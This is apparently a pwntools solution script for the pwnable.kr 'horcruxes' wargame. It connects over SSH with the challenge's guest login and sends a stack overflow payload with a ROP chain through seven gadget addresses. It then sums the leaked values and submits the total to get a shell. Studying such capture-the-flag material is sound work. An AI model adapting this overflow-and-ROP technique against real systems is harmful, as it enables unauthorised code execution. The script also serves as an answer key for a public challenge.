from pwn import *

#context.log_level = 'debug'

s = ssh(user='horcruxes',host='pwnable.kr',port=2222,password='guest')
conn = s.connect_remote('localhost', 9032)

call_ropme = 0x809FFFC

def collect_horcruxes():
	payload = "A"*0x74
	payload += p32(0xdeadbeef) #sfp
	payload += p32(0x809fe4b) #A
	payload += p32(0x809fe6a) #B
	payload += p32(0x809fe89) #C
	payload += p32(0x809fea8) #D
	payload += p32(0x809fec7) #E
	payload += p32(0x809fee6) #F
	payload += p32(0x809ff05) #G
	payload += p32(call_ropme)
	conn.recvuntil(":")
	conn.sendline(payload)
	
def Get_EXP():
	conn.recvuntil("EXP +")
	return conn.recvuntil(")")[:-1]

conn.recvuntil(":")
conn.sendline("1")

collect_horcruxes()

EXP = 0
for i in range(7):
	EXP += int(Get_EXP())
EXP = EXP&0xFFFFFFFF

if EXP>>31 == 1:
	EXP = EXP-0x100000000
log.info("EXP : %d" % EXP)

conn.recvuntil(":")
conn.sendline("1")
conn.recvuntil(":")
conn.sendline(str(EXP))

conn.interactive()

